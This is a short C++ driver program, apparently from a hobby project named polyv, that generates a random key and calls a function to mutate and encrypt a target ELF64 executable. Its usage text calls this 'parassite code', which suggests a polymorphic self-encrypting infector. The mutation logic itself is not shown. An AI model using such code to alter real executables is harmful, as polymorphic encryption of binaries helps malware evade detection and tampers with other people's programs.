
#include <iostream>

#define POLYV_IMPLEMENTATION
#include <polyv.h>

#include <elf.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_usage() {
    printf("Ignite parassite code with first encryption     \n");
    printf("usage:                                          \n");
    printf("  ignite <target>                               \n");
}

int main(int argc, char** argv) {

    const char* target = "/home/z1ko/develop/polyv/build/client2/polyv_client";
    if (argc == 2)
        target = argv[1];

    // Generate random key
    char key[POLYV_KEY_SIZE];

    srand(time(0));
    for(size_t i = 0; i < POLYV_KEY_SIZE; i++)
        key[i] = 0xFF & (i ^ rand());

    return polyv_mutate_elf64(target, key, POLYV_KEY_SIZE);;
}